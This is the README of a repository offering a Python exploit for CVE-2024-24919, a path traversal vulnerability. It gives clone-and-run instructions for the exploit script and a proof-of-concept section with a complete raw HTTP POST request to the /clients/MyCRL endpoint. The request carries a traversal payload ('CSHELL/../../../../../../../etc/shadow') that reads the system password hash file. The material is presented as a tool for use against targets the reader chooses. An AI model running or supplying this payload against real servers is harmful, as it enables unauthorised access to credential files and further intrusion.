# CVE-2024-24919-Exploit

## Overview

This repository contains a python exploit for the CVE-2024-24919, a vulnerability that allows you to read sensitive files from the vulnerable page.

This exploit first checks if the target is vulnerable, and then gets the path you specify.

**Severity**: Critical

## Usage

First clone the repository:

    git clone https://github.com/Rug4lo/CVE-2024-24919-Exploit
    cd CVE-2024-24919-Exploit

Give privileges and execute the exploit with python3

    chmod +x exploit.py
    python3 exploit.py

Then follow the steps and you will get the data of the file you specify


If you are strugling make sure the URL you specify is the main one

✓ `https://google.com`

✘ `https://google.com/search?client=firefox`

## POC (Proof Of Concept)

In this exploit we are pointing to the `{ip}/clients/MyCRL` endpoint.

This endpoint is vulnerable if we do a POST petition, we add the string `CSHELL/` and the path of the file we want to read using a Path Traversal.

The request will be something like this

    POST /clients/MyCRL HTTP/1.1
    Host: <redacted>
    Content-Length: 39

    aCSHELL/../../../../../../../etc/shadow
